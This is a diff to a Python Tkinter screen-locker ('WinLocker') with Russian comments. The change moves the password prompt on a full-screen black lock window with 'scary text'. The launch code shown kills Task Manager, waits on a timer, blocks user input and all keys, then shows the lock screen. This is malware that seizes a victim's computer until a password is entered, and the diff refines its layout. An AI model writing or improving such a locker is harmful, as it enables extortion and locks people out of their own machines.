@@ -93,11 +93,11 @@ class WinLocker:
         )
         self.canvas.create_text(50, 550, text=scary_text, fill='white', font=('Courier', 14), anchor='sw')
         
-        # Поле ввода в левом нижнем углу, прямо над страшным текстом
-        self.canvas.create_text(200, 430, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28), anchor='w')
+        # Поле ввода МАКСИМАЛЬНО ВНИЗУ, прямо над страшным текстом
+        self.canvas.create_text(200, 400, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28), anchor='w')
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
-        self.canvas.create_window(200, 480, window=self.entry, anchor='w')
-        self.status = self.canvas.create_text(200, 530, text="", fill='white', font=('Courier', 20), anchor='w')
+        self.canvas.create_window(200, 450, window=self.entry, anchor='w')
+        self.status = self.canvas.create_text(200, 500, text="", fill='white', font=('Courier', 20), anchor='w')
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
@@ -113,7 +113,6 @@ class WinLocker:
             self.entry.delete(0, tk.END)
     
     def animate(self):
-        # Просто мерцание курсора, без лишних надписей
         self.win.after(50, self.animate)
 
 # === ЗАПУСК ===
@@ -126,7 +125,7 @@ if __name__ == "__main__":
     threading.Thread(target=kill_taskmgr, daemon=True).start()
     time.sleep(TIMER_SECONDS)
     block_input(True)
-    threading.Thread(target=block_all_keys, daemon=True).start()  # Запускаем блокировку клавиш
+    threading.Thread(target=block_all_keys, daemon=True).start()
     show_boot_animation()
     app = WinLocker()
     app.root.mainloop()
